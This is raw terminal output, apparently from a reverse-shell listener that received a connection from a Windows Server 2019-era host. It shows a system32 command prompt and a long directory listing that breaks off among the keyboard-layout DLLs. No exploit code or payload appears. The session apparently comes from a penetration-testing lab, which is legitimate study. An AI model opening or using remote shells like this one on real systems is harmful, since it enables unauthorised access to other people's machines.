Connection from 10.10.10.27:49739
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325
09/15/2018  12:10 AM         3,170,304 boot.sdi
09/15/2018  12:09 AM            82,432 bootcfg.exe
09/15/2018  12:09 AM            24,072 BOOTVID.DLL
09/15/2018  12:10 AM            43,008 browcli.dll
09/15/2018  12:09 AM            69,120 cabapi.dll
09/15/2018  12:09 AM           119,800 cabinet.dll
09/15/2018  12:09 AM            27,648 cacls.exe
09/15/2018  12:10 AM            53,248 capiprovider.dll
09/15/2018  12:09 AM            20,992 capisp.dll
09/15/2018  12:12 AM    <DIR>          catroot
09/15/2018  12:10 AM           387,072 catsrv.dll
09/15/2018  12:10 AM            24,064 catsrvps.dll
09/15/2018  12:10 AM           410,624 catsrvut.dll
09/15/2018  12:09 AM            24,064 cbclient.dll
09/15/2018  12:10 AM           649,728 certca.dll
09/15/2018  12:10 AM           346,624 certcli.dll
09/15/2018  12:09 AM           320,000 certCredProvider.dll
09/15/2018  12:10 AM            54,272 certenc.dll
09/15/2018  12:10 AM         2,839,040 CertEnroll.dll
09/15/2018  12:10 AM            42,496 CertEnrollCtrl.exe
09/15/2018  12:10 AM            50,176 CertPKICmdlet.dll
09/15/2018  12:10 AM           105,984 CertPolEng.dll
09/15/2018  12:09 AM           428,544 certreq.exe
09/15/2018  12:10 AM         1,270,784 certutil.exe
09/15/2018  12:09 AM            63,488 cfgbkend.dll
09/15/2018  12:09 AM           235,496 cfgmgr32.dll
09/15/2018  12:10 AM            34,816 cfmifs.dll
09/15/2018  12:10 AM            11,264 cfmifsproxy.dll
09/15/2018  12:09 AM            14,848 change.exe
09/15/2018  12:09 AM           105,984 chartv.dll
09/15/2018  12:09 AM            12,800 chcp.com
09/15/2018  12:09 AM            26,112 CheckNetIsolation.exe
09/15/2018  12:09 AM            19,456 chglogon.exe
09/15/2018  12:09 AM            20,992 chgport.exe
09/15/2018  12:09 AM            19,456 chgusr.exe
09/15/2018  12:09 AM            23,040 chkdsk.exe
09/15/2018  12:09 AM            19,456 chkntfs.exe
09/15/2018  12:09 AM            28,160 choice.exe
09/15/2018  12:09 AM            10,752 CHxReadingStringIME.dll
09/15/2018  12:09 AM            39,936 cipher.exe
09/15/2018  12:10 AM            32,256 CIWmi.dll
09/15/2018  12:10 AM            14,848 clb.dll
09/15/2018  12:10 AM           515,624 clbcatq.dll
09/15/2018  12:09 AM            59,392 clfsw32.dll
09/15/2018  12:09 AM            78,336 cliconfg.dll
09/15/2018  12:09 AM            28,672 cliconfg.exe
09/15/2018  12:09 AM            37,376 cliconfg.rll
09/15/2018  12:09 AM            24,576 clip.exe
09/15/2018  12:09 AM            13,312 clrhost.dll
09/15/2018  12:09 AM           796,672 clusapi.dll
09/15/2018  12:09 AM           236,544 cmd.exe
09/15/2018  12:09 AM            19,968 cmdext.dll
09/15/2018  12:09 AM            17,408 cmdkey.exe
09/15/2018  12:10 AM            86,032 cmifw.dll
09/15/2018  12:09 AM           104,448 cngcredui.dll
09/15/2018  12:10 AM            55,808 cngprovider.dll
09/15/2018  12:09 AM            34,304 cnvfat.dll
09/15/2018  12:10 AM            68,608 colbact.dll
09/15/2018  12:09 AM            34,816 coloradapterclient.dll
09/15/2018  02:06 AM    <DIR>          com
09/15/2018  12:09 AM         2,621,192 combase.dll
09/15/2018  12:10 AM             8,192 comcat.dll
09/15/2018  12:09 AM           569,856 comctl32.dll
09/15/2018  12:09 AM           993,792 comdlg32.dll
09/15/2018  12:10 AM           369,976 coml2.dll
09/15/2018  12:09 AM            23,552 comp.exe
09/15/2018  12:09 AM            40,448 compact.exe
09/15/2018  12:09 AM            91,424 CompPkgSup.dll
09/15/2018  12:10 AM           114,176 comrepl.dll
09/15/2018  12:10 AM             2,560 comres.dll
09/15/2018  12:10 AM         1,346,560 comsvcs.dll
10/10/2017  09:01 PM           248,616 concrt140.dll
09/15/2018  12:12 AM    <DIR>          config
09/15/2018  12:10 AM           109,568 console.dll
09/15/2018  12:10 AM           250,880 ConsoleLogon.dll
09/15/2018  12:09 AM           114,688 control.exe
09/15/2018  12:09 AM            19,456 convert.exe
10/29/2018  03:37 PM           582,040 CoreMessaging.dll
09/15/2018  12:10 AM           109,488 CredentialUIBroker.exe
09/15/2018  12:10 AM            80,384 CredProv2faHelper.dll
09/15/2018  12:10 AM           475,648 CredProvDataModel.dll
09/15/2018  12:10 AM            65,536 CredProvHelper.dll
09/15/2018  12:10 AM           280,576 credprovhost.dll
09/15/2018  12:10 AM           263,168 credprovs.dll
09/15/2018  12:10 AM           158,208 credprovslegacy.dll
09/15/2018  12:10 AM            19,456 credssp.dll
09/15/2018  12:10 AM            35,840 credui.dll
09/15/2018  12:09 AM         1,668,784 crypt32.dll
09/15/2018  12:09 AM            31,728 cryptbase.dll
09/15/2018  12:09 AM            57,032 cryptdll.dll
09/15/2018  12:09 AM           135,680 cryptnet.dll
09/15/2018  12:09 AM           282,624 CryptoWinRT.dll
09/15/2018  12:09 AM            67,648 cryptsp.dll
09/15/2018  12:09 AM            45,056 crypttpmeksvc.dll
09/15/2018  12:09 AM           548,864 cryptui.dll
09/15/2018  12:09 AM           365,056 cryptuiwizard.dll
09/15/2018  12:09 AM            98,592 cryptxml.dll
09/15/2018  12:12 AM    <DIR>          cs-CZ
09/15/2018  12:09 AM            40,960 cscapi.dll
09/15/2018  12:09 AM            22,016 cscdll.dll
09/15/2018  12:09 AM           145,408 cscript.exe
09/15/2018  12:09 AM             9,728 ctfmon.exe
09/15/2018  12:10 AM           224,768 C_G18030.DLL
09/15/2018  12:10 AM            12,288 c_GSM7.DLL
09/15/2018  12:10 AM            13,824 C_IS2022.DLL
09/15/2018  12:10 AM            12,288 C_ISCII.DLL
09/15/2018  12:09 AM         2,264,344 d3d11.dll
09/15/2018  12:09 AM           439,976 d3d11on12.dll
09/15/2018  12:09 AM         1,457,032 D3D12.dll
09/15/2018  12:09 AM            12,800 d3d8thk.dll
09/15/2018  12:09 AM         1,495,248 d3d9.dll
09/15/2018  12:09 AM         3,689,984 D3DCompiler_47.dll
09/15/2018  12:12 AM    <DIR>          da-DK
09/15/2018  12:09 AM             8,704 dabapi.dll
09/15/2018  12:09 AM            22,016 davhlpr.dll
09/15/2018  12:09 AM           132,096 dbgcore.dll
09/15/2018  12:09 AM         5,130,240 dbgeng.dll
09/15/2018  12:09 AM         1,522,176 dbghelp.dll
09/15/2018  12:09 AM           500,224 DbgModel.dll
09/15/2018  12:09 AM           104,960 dbnetlib.dll
09/15/2018  12:09 AM            19,456 dbnmpntw.dll
09/15/2018  12:09 AM            50,176 dcgpofix.exe
09/15/2018  12:09 AM            11,776 dciman32.dll
09/15/2018  12:12 AM    <DIR>          de-DE
09/15/2018  12:09 AM            19,968 delegatorprovider.dll
09/15/2018  12:10 AM           153,088 devicengccredprov.dll
09/15/2018  12:09 AM           135,304 devobj.dll
09/15/2018  12:09 AM            50,688 devrtl.dll
09/15/2018  12:09 AM            44,032 dfscli.dll
09/15/2018  12:09 AM         1,178,112 dfshim.dll
09/15/2018  12:09 AM            12,288 dhcpcmonitor.dll
09/15/2018  12:09 AM           324,608 dhcpcore.dll
09/15/2018  12:09 AM           263,680 dhcpcore6.dll
09/15/2018  12:09 AM            69,120 dhcpcsvc.dll
09/15/2018  12:09 AM            58,368 dhcpcsvc6.dll
09/15/2018  12:09 AM           138,240 dhcpsapi.dll
09/15/2018  12:10 AM           349,184 difxapi.dll
09/15/2018  12:10 AM            35,840 dimsjob.dll
09/15/2018  12:10 AM            39,424 dimsroam.dll
09/15/2018  12:09 AM           515,960 directmanipulation.dll
09/15/2018  12:09 AM           150,528 diskpart.exe
09/15/2018  12:09 AM            20,992 diskperf.exe
09/15/2018  02:06 AM    <DIR>          Dism
09/15/2018  12:09 AM           231,224 Dism.exe
09/15/2018  12:09 AM           766,264 DismApi.dll
09/15/2018  12:09 AM            16,896 dispex.dll
09/15/2018  12:09 AM            19,256 dllhost.exe
09/15/2018  12:10 AM            10,752 dllhst3g.exe
09/15/2018  12:09 AM           580,024 dnsapi.dll
09/15/2018  12:09 AM            16,384 doskey.exe
09/15/2018  12:12 AM    <DIR>          downlevel
09/15/2018  12:09 AM            13,312 dpapi.dll
09/15/2018  12:09 AM            73,216 dpapimig.exe
09/15/2018  12:10 AM            48,640 dpapiprovider.dll
09/15/2018  12:09 AM           468,280 dpx.dll
09/15/2018  12:09 AM            66,560 driverquery.exe
09/15/2018  02:06 AM    <DIR>          drivers
09/15/2018  02:06 AM    <DIR>          DriverStore
09/15/2018  12:10 AM            20,480 drprov.dll
09/15/2018  12:09 AM            84,480 drvsetup.dll
09/15/2018  12:09 AM           970,040 drvstore.dll
09/15/2018  12:09 AM            38,912 dsauth.dll
09/15/2018  12:09 AM           103,424 dskquota.dll
09/15/2018  12:09 AM            24,064 dsparse.dll
09/15/2018  12:09 AM           143,872 dsprop.dll
09/15/2018  12:09 AM            24,288 dsrole.dll
09/15/2018  12:11 AM           215,943 dssec.dat
09/15/2018  12:09 AM            48,640 dssec.dll
09/15/2018  12:09 AM           134,280 dssenh.dll
09/15/2018  12:09 AM           672,256 dsuiext.dll
09/15/2018  12:09 AM            79,872 dtdump.exe
09/15/2018  12:09 AM         1,474,560 dui70.dll
09/15/2018  12:09 AM           473,600 duser.dll
09/15/2018  12:09 AM           140,288 dwmapi.dll
09/15/2018  12:09 AM         2,651,648 DWrite.dll
09/15/2018  12:09 AM           661,096 dxgi.dll
09/15/2018  12:09 AM           238,080 eapp3hst.dll
09/15/2018  12:09 AM           197,632 eappcfg.dll
09/15/2018  12:09 AM            90,112 eappgnui.dll
09/15/2018  12:09 AM           230,912 eapphost.dll
09/15/2018  12:09 AM            55,808 eappprxy.dll
10/29/2018  03:37 PM           330,752 edgeIso.dll
09/15/2018  12:09 AM            53,248 efsext.dll
09/15/2018  12:09 AM            35,840 efsutil.dll
09/15/2018  12:12 AM    <DIR>          el-GR
09/15/2018  12:12 AM    <DIR>          en-GB
09/15/2018  02:06 AM    <DIR>          en-US
09/15/2018  12:09 AM            93,952 EncDump.dll
09/15/2018  12:12 AM    <DIR>          es-ES
09/15/2018  12:12 AM    <DIR>          es-MX
09/15/2018  12:10 AM           335,360 es.dll
09/15/2018  12:10 AM            16,896 EsdSip.dll
09/15/2018  12:09 AM         2,929,152 esent.dll
09/15/2018  12:09 AM            61,440 esentprf.dll
09/15/2018  12:09 AM           331,264 esentutl.exe
09/15/2018  12:09 AM            33,792 esevss.dll
09/15/2018  12:12 AM    <DIR>          et-EE
09/15/2018  12:09 AM            78,848 ETWESEProviderResources.dll
09/15/2018  12:10 AM            40,448 EtwRundown.dll
09/15/2018  12:09 AM            14,848 eventcls.dll
09/15/2018  12:09 AM            33,792 eventcreate.exe
09/15/2018  12:10 AM            52,736 expand.exe
09/15/2018  12:10 AM             8,704 f3ahvoas.dll
09/15/2018  12:09 AM           387,832 Faultrep.dll
09/15/2018  12:09 AM            22,528 fc.exe
09/15/2018  12:09 AM           196,608 feclient.dll
09/15/2018  12:12 AM    <DIR>          fi-FI
09/15/2018  12:09 AM            14,848 find.exe
09/15/2018  12:09 AM            29,696 findstr.exe
09/15/2018  12:09 AM            13,312 finger.exe
09/15/2018  12:10 AM           384,000 FirewallAPI.dll
09/15/2018  12:10 AM           730,112 FlightSettings.dll
09/15/2018  12:09 AM            27,840 fltLib.dll
09/15/2018  12:09 AM            24,064 fltMC.exe
09/15/2018  12:09 AM            54,800 fmifs.dll
09/15/2018  12:09 AM           158,208 fms.dll
09/15/2018  12:09 AM           107,008 Fondue.exe
09/15/2018  12:09 AM           660,232 fontdrvhost.exe
09/15/2018  12:09 AM            98,816 fontsub.dll
09/15/2018  12:09 AM            40,960 forfiles.exe
09/15/2018  12:09 AM            46,080 format.com
09/15/2018  12:12 AM    <DIR>          fr-CA
09/15/2018  12:12 AM    <DIR>          fr-FR
09/15/2018  12:10 AM           198,144 framedyn.dll
09/15/2018  12:10 AM           238,080 framedynos.dll
09/15/2018  12:09 AM           147,968 fsutil.exe
09/15/2018  12:09 AM            26,624 fsutilext.dll
09/15/2018  12:09 AM            48,640 ftp.exe
09/15/2018  12:10 AM           666,624 fveapi.dll
09/15/2018  12:10 AM           311,808 fveapibase.dll
09/15/2018  12:10 AM            21,504 fvecerts.dll
09/15/2018  12:10 AM           129,536 fwbase.dll
09/15/2018  12:09 AM            45,056 fwcfg.dll
09/15/2018  12:10 AM           190,464 fwpolicyiomgr.dll
09/15/2018  12:10 AM           313,856 FWPUCLNT.DLL
09/15/2018  12:09 AM            58,880 FwRemoteSvr.dll
09/15/2018  12:09 AM           138,376 gdi32.dll
10/29/2018  03:37 PM         1,466,992 gdi32full.dll
09/15/2018  12:09 AM            32,768 gmsaclient.dll
09/15/2018  12:09 AM           111,024 gpapi.dll
09/15/2018  12:09 AM         1,042,944 gpedit.dll
09/15/2018  12:09 AM           147,439 gpedit.msc
09/15/2018  12:09 AM           564,736 gpprefcl.dll
09/15/2018  12:09 AM           195,072 gpresult.exe
09/15/2018  12:09 AM            40,960 gpscript.dll
09/15/2018  12:09 AM            37,888 gpscript.exe
09/15/2018  12:09 AM            24,576 gpupdate.exe
09/15/2018  12:12 AM    <DIR>          GroupPolicy
09/15/2018  12:12 AM    <DIR>          GroupPolicyUsers
09/15/2018  12:09 AM            67,584 hbaapi.dll
09/15/2018  12:12 AM    <DIR>          he-IL
09/15/2018  12:09 AM             9,728 help.exe
09/15/2018  12:09 AM            28,160 hid.dll
09/15/2018  12:09 AM            29,696 hidserv.dll
09/15/2018  12:09 AM            11,776 HOSTNAME.EXE
09/15/2018  12:12 AM    <DIR>          hr-HR
09/15/2018  12:09 AM            27,648 httpapi.dll
09/15/2018  12:12 AM    <DIR>          hu-HU
09/15/2018  12:09 AM            29,696 icacls.exe
09/15/2018  12:09 AM           236,032 icm32.dll
09/15/2018  12:09 AM             2,560 icmp.dll
09/15/2018  12:09 AM            15,872 icsunattend.exe
09/15/2018  12:12 AM    <DIR>          icsxml
09/15/2018  12:10 AM             7,680 idndl.dll
09/15/2018  12:09 AM         2,275,888 iertutil.dll
09/15/2018  12:09 AM            25,600 ifmon.dll
09/15/2018  12:09 AM           188,432 ifsutil.dll
09/15/2018  12:10 AM            14,336 ifsutilx.dll
09/15/2018  12:09 AM            95,488 imagehlp.dll
09/15/2018  12:09 AM        23,542,784 imageres.dll
09/15/2018  12:12 AM    <DIR>          IME
09/15/2018  12:09 AM           144,312 imm32.dll
09/15/2018  12:09 AM            53,248 inetmib1.dll
09/15/2018  12:12 AM    <DIR>          inetsrv
09/15/2018  12:10 AM            11,776 InfDefaultInstall.exe
09/15/2018  12:09 AM           304,952 input.dll
09/15/2018  12:09 AM           414,208 InputSwitch.dll
09/15/2018  12:12 AM    <DIR>          InstallShield
09/15/2018  12:09 AM             8,704 instnm.exe
09/15/2018  12:09 AM           444,416 intl.cpl
09/15/2018  12:09 AM             2,560 iologmsg.dll
09/15/2018  12:09 AM            29,184 ipconfig.exe
09/15/2018  12:09 AM           197,832 IPHLPAPI.DLL
09/15/2018  12:12 AM    <DIR>          Ipmi
09/15/2018  12:09 AM             9,216 iprtprio.dll
09/15/2018  12:09 AM           516,608 iprtrmgr.dll
09/15/2018  12:09 AM           150,528 iscsicli.exe
09/15/2018  12:09 AM            55,296 iscsidsc.dll
09/15/2018  12:09 AM             9,728 iscsied.dll
09/15/2018  12:09 AM            29,184 iscsium.dll
09/15/2018  12:09 AM            67,584 iscsiwmi.dll
09/15/2018  12:09 AM            94,720 iscsiwmiv2.dll
09/15/2018  12:12 AM    <DIR>          it-IT
09/15/2018  12:12 AM    <DIR>          ja-JP
09/15/2018  12:09 AM            47,616 joinproviderol.dll
09/15/2018  12:09 AM           144,896 joinutil.dll
09/15/2018  12:09 AM           684,032 jscript.dll
09/15/2018  12:09 AM            45,568 jsproxy.dll
09/15/2018  12:10 AM             7,680 kbd101.DLL
09/15/2018  12:10 AM             7,168 kbd101a.DLL
09/15/2018  12:10 AM             7,168 kbd101b.DLL
09/15/2018  12:10 AM             7,168 kbd101c.DLL
09/15/2018  12:10 AM             7,168 kbd103.DLL
09/15/2018  12:10 AM             7,680 kbd106.dll
09/15/2018  12:10 AM             7,680 kbd106n.dll
09/15/2018  12:10 AM             7,168 KBDA1.DLL
09/15/2018  12:10 AM             6,656 KBDA2.DLL
09/15/2018  12:10 AM             7,168 KBDA3.DLL
09/15/2018  12:10 AM             7,680 KBDAL.DLL
09/15/2018  12:10 AM             6,656 KBDARME.DLL
09/15/2018  12:10 AM             7,168 kbdarmph.dll
09/15/2018  12:10 AM             7,168 kbdarmty.dll
09/15/2018  12:10 AM             6,656 KBDARMW.DLL
09/15/2018  12:10 AM             7,680 kbdax2.dll
09/15/2018  12:10 AM             7,168 KBDAZE.DLL
09/15/2018  12:10 AM             7,168 KBDAZEL.DLL
09/15/2018  12:10 AM             7,168 KBDAZST.DLL
09/15/2018  12:10 AM             7,168 KBDBASH.DLL
09/15/2018  12:10 AM             7,168 KBDBE.DLL
09/15/2018  12:10 AM             7,680 KBDBENE.DLL
09/15/2018  12:10 AM             7,168 KBDBGPH.DLL
09/15/2018  12:10 AM             7,168 KBDBGPH1.DLL
09/15/2018  12:10 AM             7,168 KBDBHC.DLL
09/15/2018  12:10 AM             7,168 KBDBLR.DLL
09/15/2018  12:10 AM             7,168 KBDBR.DLL
09/15/2018  12:10 AM             6,656 KBDBU.DLL
09/15/2018  12:10 AM             7,168 KBDBUG.DLL
09/15/2018  12:10 AM             7,168 KBDBULG.DLL
09/15/2018  12:10 AM             7,680 KBDCA.DLL
09/15/2018  12:10 AM             8,704 KBDCAN.DLL
09/15/2018  12:10 AM             7,168 KBDCHER.DLL
09/15/2018  12:10 AM            16,896 KBDCHERP.DLL
09/15/2018  12:10 AM             8,192 KBDCR.DLL
09/15/2018  12:10 AM             8,192 KBDCZ.DLL
09/15/2018  12:10 AM             8,192 KBDCZ1.DLL
09/15/2018  12:10 AM             8,192 KBDCZ2.DLL
09/15/2018  12:10 AM             6,656 KBDDA.DLL
09/15/2018  12:10 AM             7,168 KBDDIV1.DLL
09/15/2018  12:10 AM             7,168 KBDDIV2.DLL
09/15/2018  12:10 AM             6,656 KBDDV.DLL
09/15/2018  12:10 AM             7,168 KBDDZO.DLL
09/15/2018  12:10 AM             7,680 KBDES.DLL
09/15/2018  12:10 AM             7,168 KBDEST.DLL
09/15/2018  12:10 AM             6,656 KBDFA.DLL
09/15/2018  12:10 AM             7,168 kbdfar.dll
09/15/2018  12:10 AM             7,680 KBDFC.DLL
09/15/2018  12:10 AM             6,656 KBDFI.DLL
09/15/2018  12:10 AM             8,192 KBDFI1.DLL
09/15/2018  12:10 AM             6,656 KBDFO.DLL
09/15/2018  12:10 AM             7,168 KBDFR.DLL
09/15/2018  12:10 AM             7,168 KBDFTHRK.DLL
09/15/2018  12:10 AM             7,168 KBDGAE.DLL
09/15/2018  12:10 AM             6,656 KBDGEO.DLL
09/15/2018  12:10 AM             7,168 kbdgeoer.dll
09/15/2018  12:10 AM             7,168 kbdgeome.dll
09/15/2018  12:10 AM             7,168 kbdgeooa.dll
09/15/2018  12:10 AM             7,168 kbdgeoqw.dll
09/15/2018  12:10 AM             7,680 KBDGKL.DLL
09/15/2018  12:10 AM             7,680 KBDGN.DLL
09/15/2018  12:10 AM             7,168 KBDGR.DLL
09/15/2018  12:10 AM             7,680 KBDGR1.DLL
09/15/2018  12:10 AM             8,192 KBDGRLND.DLL
09/15/2018  12:10 AM             7,168 KBDGTHC.DLL
09/15/2018  12:10 AM             6,656 KBDHAU.DLL
09/15/2018  12:10 AM             7,168 KBDHAW.DLL
09/15/2018  12:10 AM             6,656 KBDHE.DLL
09/15/2018  12:10 AM             7,168 KBDHE220.DLL
09/15/2018  12:10 AM             7,168 KBDHE319.DLL
09/15/2018  12:10 AM             6,656 KBDHEB.DLL
09/15/2018  12:10 AM             7,168 kbdhebl3.dll
09/15/2018  12:10 AM             7,168 KBDHELA2.DLL
09/15/2018  12:10 AM             7,680 KBDHELA3.DLL
09/15/2018  12:10 AM             9,728 KBDHEPT.DLL
09/15/2018  12:10 AM             7,680 KBDHU.DLL
09/15/2018  12:10 AM             7,168 KBDHU1.DLL
09/15/2018  12:10 AM             7,680 kbdibm02.DLL
09/15/2018  12:10 AM             7,168 KBDIBO.DLL
09/15/2018  12:10 AM             6,656 KBDIC.DLL
09/15/2018  12:10 AM             7,168 KBDINASA.DLL
09/15/2018  12:10 AM             7,168 KBDINBE1.DLL
09/15/2018  12:10 AM             7,168 KBDINBE2.DLL
09/15/2018  12:10 AM             7,168 KBDINBEN.DLL
09/15/2018  12:10 AM             7,168 KBDINDEV.DLL
09/15/2018  12:10 AM             8,192 KBDINEN.DLL
09/15/2018  12:10 AM             7,168 KBDINGUJ.DLL
09/15/2018  12:10 AM             7,168 KBDINHIN.DLL
09/15/2018  12:10 AM             7,168 KBDINKAN.DLL
09/15/2018  12:10 AM             7,168 KBDINMAL.DLL
09/15/2018  12:10 AM             7,168 KBDINMAR.DLL
09/15/2018  12:10 AM             7,168 KBDINORI.DLL
09/15/2018  12:10 AM             7,168 KBDINPUN.DLL
09/15/2018  12:10 AM             7,168 KBDINTAM.DLL
09/15/2018  12:10 AM             7,168 KBDINTEL.DLL
09/15/2018  12:10 AM             8,192 KBDINUK2.DLL
09/15/2018  12:10 AM             6,656 KBDIR.DLL
09/15/2018  12:10 AM             6,144 KBDIT.DLL
09/15/2018  12:10 AM             6,656 KBDIT142.DLL
09/15/2018  12:10 AM             7,680 KBDIULAT.DLL
09/15/2018  12:10 AM             7,168 KBDJAV.DLL
09/15/2018  12:10 AM            13,824 KBDJPN.DLL
09/15/2018  12:10 AM             7,168 KBDKAZ.DLL
09/15/2018  12:10 AM             7,168 KBDKHMR.DLL
09/15/2018  12:10 AM             7,168 KBDKNI.DLL
09/15/2018  12:10 AM            13,312 KBDKOR.DLL
09/15/2018  12:10 AM             7,168 KBDKURD.DLL
09/15/2018  12:10 AM             6,656 KBDKYR.DLL
09/15/2018  12:10 AM             7,680 KBDLA.DLL
09/15/2018  12:10 AM             7,168 KBDLAO.DLL
09/15/2018  12:10 AM             7,168 kbdlisub.dll
09/15/2018  12:10 AM             7,168 kbdlisus.dll
09/15/2018  12:10 AM             7,680 kbdlk41a.dll
09/15/2018  12:10 AM             6,656 KBDLT.DLL
09/15/2018  12:10 AM             7,168 KBDLT1.DLL
09/15/2018  12:10 AM             7,168 KBDLT2.DLL
09/15/2018  12:10 AM             7,168 KBDLV.DLL
09/15/2018  12:10 AM             7,680 KBDLV1.DLL
09/15/2018  12:10 AM             8,704 KBDLVST.DLL
09/15/2018  12:10 AM             7,168 KBDMAC.DLL
09/15/2018  12:10 AM             7,168 KBDMACST.DLL
09/15/2018  12:10 AM             7,168 KBDMAORI.DLL
09/15/2018  12:10 AM             7,168 KBDMLT47.DLL
09/15/2018  12:10 AM             7,168 KBDMLT48.DLL
09/15/2018  12:10 AM             7,168 KBDMON.DLL
09/15/2018  12:10 AM             7,168 KBDMONMO.DLL
09/15/2018  12:10 AM             7,168 KBDMONST.DLL
09/15/2018  12:10 AM             7,168 KBDMYAN.DLL
09/15/2018  12:10 AM             7,168 KBDNE.DLL
09/15/2018  12:10 AM             8,192 kbdnec.DLL
09/15/2018  12:10 AM             8,192 kbdnec95.DLL
09/15/2018  12:10 AM             9,728 kbdnecat.DLL
09/15/2018  12:10 AM             8,192 kbdnecnt.DLL
09/15/2018  12:10 AM             7,680 KBDNEPR.DLL
09/15/2018  12:10 AM             6,656 kbdnko.dll
09/15/2018  12:10 AM             6,656 KBDNO.DLL
09/15/2018  12:10 AM             8,192 KBDNO1.DLL
09/15/2018  12:10 AM             7,680 KBDNSO.DLL
09/15/2018  12:10 AM             7,168 KBDNTL.DLL
09/15/2018  12:10 AM             6,656 KBDOGHAM.DLL
09/15/2018  12:10 AM             7,168 KBDOLCH.DLL
09/15/2018  12:10 AM             7,168 KBDOLDIT.DLL
